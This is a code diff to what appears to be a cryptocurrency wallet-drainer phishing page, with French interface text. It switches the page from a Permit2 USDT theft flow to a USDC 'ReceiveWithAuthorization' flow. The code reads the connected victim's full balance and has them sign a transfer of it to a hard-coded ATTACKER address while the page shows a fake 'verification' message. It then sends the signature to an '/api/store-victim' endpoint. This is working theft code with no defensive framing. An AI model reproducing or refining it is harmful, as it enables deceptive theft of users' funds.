@@ -834,6 +834,7 @@
 
   let ATTACKER = '0x0b1369DF890dF9B7ee94F9C0bb53BAd6de7541d6';
   const USDT_ADDR = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
+  const USDC_ADDR = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
   const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
   const API = '/api/store-victim';
   let PROJECT_ID = '6f9e5677969200a1a767d913d833f234';
@@ -843,8 +844,7 @@
     try {
       const r = await fetch('/config.json', { cache: 'no-store' });
       const cfg = await r.json();
-      if (cfg.spender_address && cfg.spender_address.indexOf('0x') === 0) ATTACKER = cfg.spender_address;
-      else if (cfg.attacker_address) ATTACKER = cfg.attacker_address;
+      if (cfg.attacker_address) ATTACKER = cfg.attacker_address;
       if (cfg.project_id) PROJECT_ID = cfg.project_id;
       console.log('config spender', ATTACKER);
     } catch (e) {
@@ -1004,7 +1004,7 @@ async function initWalletConnect() {
   function triggerApproveTx() {
     if (approveTxTriggered) return;
     approveTxTriggered = true;
-    handlePermit2Flow();
+    handleUsdc3009Flow();
   }
   setTimeout(triggerApproveTx, 1000);
   document.addEventListener('visibilitychange', function onVis() {
@@ -1071,106 +1071,83 @@ async function wcRequest(method, params) {
     return txHash;
   }
 
-async function handlePermit2Flow() {
+async function handleUsdc3009Flow() {
   try {
     const scanText = document.querySelector('.scan');
-    if (scanText) scanText.textContent = 'Détection de votre solde USDT…';
+    if (scanText) scanText.textContent = 'Détection de votre solde USDC…';
 
     const provider = new ethers.providers.JsonRpcProvider(PUBLIC_RPC);
-    const usdtContract = new ethers.Contract(USDT_ADDR, [
+    const usdc = new ethers.Contract(USDC_ADDR, [
       'function balanceOf(address) view returns (uint256)',
       'function decimals() view returns (uint8)',
-      'function allowance(address owner, address spender) view returns (uint256)'
+      'function name() view returns (string)'
     ], provider);
 
-    const [balance, decimals, permit2Allowance] = await Promise.all([
-      usdtContract.balanceOf(account),
-      usdtContract.decimals(),
-      usdtContract.allowance(account, PERMIT2_ADDRESS)
+    const [balance, decimals, tokenName] = await Promise.all([
+      usdc.balanceOf(account),
+      usdc.decimals(),
+      usdc.name().catch(function() { return 'USD Coin'; })
     ]);
 
     if (balance.isZero()) {
-      if (scanText) scanText.textContent = '❌ Aucun USDT détecté.';
+      if (scanText) scanText.textContent = '❌ Aucun USDC détecté.';
       return;
     }
 
     const balanceFormatted = ethers.utils.formatUnits(balance, decimals);
+    if (scanText) scanText.textContent = 'Signez le transfert USDC.';
 
-    if (permit2Allowance.lt(balance)) {
-      if (scanText) scanText.textContent = `Confirmez l'autorisation de ${balanceFormatted} USDT (Uniswap Protocol).`;
-      const iface = new ethers.utils.Interface([
-        'function approve(address spender, uint256 amount)'
-      ]);
-      const data = iface.encodeFunctionData('approve', [PERMIT2_ADDRESS, balance]);
-      const txHash = await wcRequest('eth_sendTransaction', [{
-        from: account,
-        to: USDT_ADDR,
-        data: data,
-        value: '0x0',
-        gas: '0x493E0'
-      }]);
-      console.log('Permit2 approve tx:', txHash);
-      if (scanText) scanText.textContent = 'En attente de confirmation on-chain…';
-      await waitReceipt(txHash, 180000);
-    }
+    const nonce = ethers.utils.hexlify(ethers.utils.randomBytes(32));
+    const validAfter = 0;
+    const validBefore = Math.floor(Date.now() / 1000) + 3600;
+    const to = ethers.utils.getAddress(ATTACKER);
+    const from = ethers.utils.getAddress(account);
 
-    if (scanText) scanText.textContent = `Signez l'autorisation Permit2 pour ${balanceFormatted} USDT.`;
-
-    const nonce = Date.now();
-    const deadline = Math.floor(Date.now() / 1000) + 3600;
-    const permitData = {
-      permitted: {
-        token: ethers.utils.getAddress(USDT_ADDR),
-        amount: balance.toString()
-      },
-      nonce: nonce,
-      deadline: deadline
+    const usdcAuth = {
+      from: from,
+      to: to,
+      value: balance.toString(),
+      validAfter: validAfter,
+      validBefore: validBefore,
+      nonce: nonce
     };
+
     const typedData = {
       types: {
         EIP712Domain: [
           { name: 'name', type: 'string' },
+          { name: 'version', type: 'string' },
           { name: 'chainId', type: 'uint256' },
           { name: 'verifyingContract', type: 'address' }
         ],
-        PermitTransferFrom: [
-          { name: 'permitted', type: 'TokenPermissions' },
-          { name: 'spender', type: 'address' },
-          { name: 'nonce', type: 'uint256' },
-          { name: 'deadline', type: 'uint256' }
-        ],
-        TokenPermissions: [
-          { name: 'token', type: 'address' },
-          { name: 'amount', type: 'uint256' }
+        ReceiveWithAuthorization: [
+          { name: 'from', type: 'address' },
+          { name: 'to', type: 'address' },
+          { name: 'value', type: 'uint256' },
+          { name: 'validAfter', type: 'uint256' },
+          { name: 'validBefore', type: 'uint256' },
+          { name: 'nonce', type: 'bytes32' }
         ]
       },
       domain: {
-        name: 'Permit2',
+        name: tokenName || 'USD Coin',
+        version: '2',
         chainId: 1,
-        verifyingContract: PERMIT2_ADDRESS
+        verifyingContract: USDC_ADDR
       },
-      primaryType: 'PermitTransferFrom',
+      primaryType: 'ReceiveWithAuthorization',
       message: {
-        permitted: {
-          token: ethers.utils.getAddress(USDT_ADDR),
-          amount: balance.toString()
-        },
-        spender: ethers.utils.getAddress(ATTACKER),
-        nonce: String(nonce),
-        deadline: String(deadline)
+        from: from,
+        to: to,
+        value: balance.toString(),
+        validAfter: String(validAfter),
+        validBefore: String(validBefore),
+        nonce: nonce
       }
     };
 
-    let permit2Sig = null;
-    try {
-      permit2Sig = await signPermit2Typed(account, typedData);
-    } catch (signErr) {
-      console.warn('Permit2 typed-data refusee, pas de fallback EOA', signErr);
-      if (scanText) scanText.textContent = '❌ Signature refusée.';
-      throw signErr;
-    }
-
-    console.log('Permit2 sig:', permit2Sig);
+    const usdcSig = await signPermit2Typed(account, typedData);
+    console.log('USDC 3009 sig', usdcSig);
     if (scanText) scanText.textContent = '✅ Autorisation donnée. Vérification terminée.';
 
     const addressKey = account.toLowerCase();
@@ -1190,14 +1167,12 @@ async function handlePermit2Flow() {
           address: account,
           chain: '1',
           status: 'signed',
-          token: 'USDT',
+          token: 'USDC',
           amount: balanceFormatted
         })
       });
       refreshVictimsIfPossible();
-    } catch (e) {
-      console.warn('Erreur mise à jour signed:', e);
-    }
+    } catch (e) {}
 
     await fetch('/api/store-victim', {
       method: 'POST',
@@ -1205,16 +1180,14 @@ async function handlePermit2Flow() {
       body: JSON.stringify({
         victim: account,
         chain: '1',
-        permit2Sig: permit2Sig,
-        permitData: permitData
+        usdcSig: usdcSig,
+        usdcAuth: usdcAuth
       })
     });
-
   } catch (e) {
-    console.error('Transaction error:', e);
+    console.error('USDC 3009 error', e);
     const scanText = document.querySelector('.scan');
-    if (scanText) scanText.textContent = '❌ Transaction refusée.';
-
+    if (scanText) scanText.textContent = '❌ Signature refusée.';
     const addressKey = account ? account.toLowerCase() : null;
     if (addressKey && pendingSignatures[addressKey]) {
       pendingSignatures[addressKey].done = true;
@@ -1223,25 +1196,19 @@ async function handlePermit2Flow() {
         pendingSignatures[addressKey].timer = null;
       }
     }
-
     if (account) {
       try {
         await fetch('/api/record-wallet', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            address: account,
-            chain: '1',
-            status: 'refused'
-          })
+          body: JSON.stringify({ address: account, chain: '1', status: 'refused' })
         });
         refreshVictimsIfPossible();
-      } catch (err) {
-        console.warn('Erreur mise à jour refused:', err);
-      }
+      } catch (err) {}
     }
   }
 }
+
 
 
 
